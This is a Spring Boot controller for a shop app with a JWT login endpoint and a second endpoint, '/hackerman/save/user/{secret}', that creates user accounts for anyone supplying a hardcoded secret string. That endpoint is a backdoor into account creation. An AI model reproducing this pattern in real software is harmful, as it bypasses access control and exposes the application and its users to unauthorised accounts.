package com.davydov.shop.controllers;

import com.davydov.shop.beans.JwtTokenUtil;
import com.davydov.shop.dto.JwtRequest;
import com.davydov.shop.dto.JwtResponse;
import com.davydov.shop.dto.UserDto;
import com.davydov.shop.service.UserService;
import lombok.AllArgsConstructor;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AllArgsConstructor
public class AuthController {
  private UserService userService;
  private JwtTokenUtil jwtTokenUtil;
  private AuthenticationManager authenticationManager;

  @PostMapping("/auth")
  public ResponseEntity<?> createToken(@RequestBody JwtRequest jwtRequest) {
//        try {
    authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(jwtRequest.getUsername(),
      jwtRequest.getPassword()));
//        } catch (BadCredentialsException e) {
//            return new ResponseEntity<>()
//        }
    UserDetails userDetails = userService.loadUserByUsername(jwtRequest.getUsername());
    String token = jwtTokenUtil.generateToken(userDetails);
    return ResponseEntity.ok(new JwtResponse(token));
  }

  @PostMapping("/hackerman/save/user/{secret}")
  public ResponseEntity<?> createHackerUser(
    @PathVariable String secret,
    @RequestBody UserDto userDto) {
    if ("IMBIGDADDYHACKER".equals(secret)) {
      userService.registerNewUserAccount(userDto);
      return ResponseEntity.ok("CREATED!");
    } else {
      return new ResponseEntity(HttpStatus.BAD_REQUEST);
    }
  }
}
